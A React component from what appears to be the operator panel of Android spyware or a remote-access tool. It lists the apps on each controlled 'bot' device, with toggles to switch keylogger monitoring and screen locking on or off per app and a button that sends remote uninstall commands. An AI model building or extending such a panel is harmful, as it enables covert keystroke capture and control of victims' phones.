import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface AppManagerProps {
  bot: Bot;
}

export const AppManager: React.FC<AppManagerProps> = ({ bot }) => {
  const [search, setSearch] = useState('');
  const [appType, setAppType] = useState<'all' | 'user' | 'system'>('all');

  const apps = StorageService.getApps(bot.id);

  const filteredApps = apps.filter(app => {
    const matchesSearch = app.appName.toLowerCase().includes(search.toLowerCase()) || 
                          app.packageName.toLowerCase().includes(search.toLowerCase());
    
    if (appType === 'user') return matchesSearch && !app.isSystem;
    if (appType === 'system') return matchesSearch && app.isSystem;
    return matchesSearch;
  });

  const handleToggleLock = (packageName: string) => {
    StorageService.toggleAppLock(bot.id, packageName);
  };

  const handleToggleTracking = (packageName: string) => {
    StorageService.toggleAppTracking(bot.id, packageName);
  };

  const handleUninstall = (packageName: string, appName: string) => {
    StorageService.addLog('warning', `Comando de desinstalação enviado para ${appName}`, bot.id, bot.name);
    alert(`Comando de desinstalação enviado para o pacote: ${packageName}`);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', padding: '16px' }}>
      
      {/* Filtering tools */}
      <div className="glass-panel" style={{ padding: '12px 16px', display: 'flex', gap: '10px', flexWrap: 'wrap', alignItems: 'center' }}>
        <input 
          type="text" 
          placeholder="Buscar aplicativo ou pacote..." 
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          style={{ flex: 1, minWidth: '180px', fontSize: '13px' }}
        />
        <select 
          value={appType} 
          onChange={(e) => setAppType(e.target.value as any)}
          style={{ fontSize: '13px', minWidth: '140px' }}
        >
          <option value="all">Todos os Apps</option>
          <option value="user">Instalados pelo Usuário</option>
          <option value="system">Apps de Sistema</option>
        </select>
      </div>

      {/* Apps Content Layout */}
      <div className="glass-panel" style={{ padding: '16px' }}>
        
        {/* Desktop Table View */}
        <div className="desktop-table-view" style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
            <thead>
              <tr style={{ borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)' }}>
                <th style={{ padding: '10px 6px' }}>Aplicativo</th>
                <th style={{ padding: '10px 6px' }}>Pacote</th>
                <th style={{ padding: '10px 6px' }}>Tipo</th>
                <th style={{ padding: '10px 6px', textAlign: 'center' }}>Monitorar Keylogger</th>
                <th style={{ padding: '10px 6px', textAlign: 'center' }}>Bloqueio de Tela</th>
                <th style={{ padding: '10px 6px', textAlign: 'right' }}>Ações</th>
              </tr>
            </thead>
            <tbody>
              {filteredApps.map(app => (
                <tr key={app.packageName} style={{ borderBottom: '1px solid rgba(255, 255, 255, 0.02)' }}>
                  <td style={{ padding: '10px 6px', fontWeight: '500', color: 'var(--text-primary)' }}>
                    {app.appName}
                  </td>
                  <td style={{ padding: '10px 6px', fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--accent-cyan)' }}>
                    {app.packageName}
                  </td>
                  <td style={{ padding: '10px 6px' }}>
                    <span style={{ 
                      fontSize: '10px', 
                      background: app.isSystem ? 'rgba(255,255,255,0.04)' : 'rgba(139,92,246,0.1)', 
                      color: app.isSystem ? 'var(--text-secondary)' : 'var(--accent-purple)',
                      padding: '2px 5px',
                      borderRadius: '4px',
                      fontWeight: '600'
                    }}>
                      {app.isSystem ? 'SISTEMA' : 'USUÁRIO'}
                    </span>
                  </td>
                  <td style={{ padding: '10px 6px', textAlign: 'center' }}>
                    <input 
                      type="checkbox" 
                      checked={app.tracked}
                      onChange={() => handleToggleTracking(app.packageName)}
                      style={{ cursor: 'pointer', transform: 'scale(1.1)' }}
                    />
                  </td>
                  <td style={{ padding: '10px 6px', textAlign: 'center' }}>
                    <button 
                      onClick={() => handleToggleLock(app.packageName)}
                      style={{
                        padding: '4px 8px',
                        fontSize: '11px',
                        borderRadius: '4px',
                        background: app.locked ? 'var(--danger)' : 'var(--bg-tertiary)',
                        color: 'white',
                        border: app.locked ? 'none' : '1px solid var(--border-color)',
                        minHeight: '28px'
                      }}
                    >
                      {app.locked ? '🔒 BLOQUEADO' : '🔓 LIBERADO'}
                    </button>
                  </td>
                  <td style={{ padding: '10px 6px', textAlign: 'right' }}>
                    <button 
                      className="btn btn-secondary" 
                      onClick={() => handleUninstall(app.packageName, app.appName)}
                      disabled={app.isSystem}
                      style={{ 
                        padding: '2px 6px', 
                        fontSize: '11px', 
                        color: 'var(--danger)',
                        opacity: app.isSystem ? 0.4 : 1,
                        minHeight: '26px'
                      }}
                    >
                      Desinstalar
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Mobile Card List View (< 768px) */}
        <div className="mobile-card-grid">
          {filteredApps.map(app => (
            <div 
              key={app.packageName} 
              className="mobile-card"
              style={{
                borderColor: app.locked ? 'var(--danger)' : 'var(--border-color)',
                padding: '12px'
              }}
            >
              {/* App metadata header */}
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                <div>
                  <h4 style={{ fontSize: '14px', fontWeight: '600', color: 'var(--text-primary)' }}>{app.appName}</h4>
                  <span style={{ fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)', wordBreak: 'break-all' }}>
                    {app.packageName}
                  </span>
                </div>
                <span style={{ 
                  fontSize: '9px', 
                  background: app.isSystem ? 'rgba(255,255,255,0.05)' : 'rgba(139,92,246,0.1)', 
                  color: app.isSystem ? 'var(--text-secondary)' : 'var(--accent-purple)',
                  padding: '1px 4px',
                  borderRadius: '3px',
                  fontWeight: '600'
                }}>
                  {app.isSystem ? 'SYS' : 'USR'}
                </span>
              </div>

              {/* Toggles bar */}
              <div style={{ 
                display: 'flex', 
                justifyContent: 'space-between', 
                alignItems: 'center', 
                borderTop: '1px solid rgba(255,255,255,0.04)', 
                paddingTop: '8px',
                marginTop: '4px',
                fontSize: '12px'
              }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '6px', cursor: 'pointer', color: 'var(--text-secondary)' }}>
                  <input 
                    type="checkbox" 
                    checked={app.tracked}
                    onChange={() => handleToggleTracking(app.packageName)}
                    style={{ cursor: 'pointer' }}
                  />
                  Keylogger
                </label>

                <button 
                  onClick={() => handleToggleLock(app.packageName)}
                  style={{
                    padding: '4px 8px',
                    fontSize: '11px',
                    borderRadius: '4px',
                    background: app.locked ? 'var(--danger)' : 'var(--bg-tertiary)',
                    color: 'white',
                    border: app.locked ? 'none' : '1px solid var(--border-color)',
                    minHeight: '26px'
                  }}
                >
                  {app.locked ? '🔒 Bloqueado' : '🔓 Liberado'}
                </button>
              </div>

              {/* Action bar */}
              {!app.isSystem && (
                <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '4px' }}>
                  <button 
                    className="btn btn-secondary"
                    onClick={() => handleUninstall(app.packageName, app.appName)}
                    style={{ padding: '2px 8px', fontSize: '11px', color: 'var(--danger)', minHeight: '26px', width: '100%' }}
                  >
                    Desinstalar Aplicativo
                  </button>
                </div>
              )}
            </div>
          ))}
        </div>

      </div>

      <style>{`
        @media (min-width: 769px) {
          .desktop-table-view { display: block !important; }
        }
      `}</style>
    </div>
  );
};
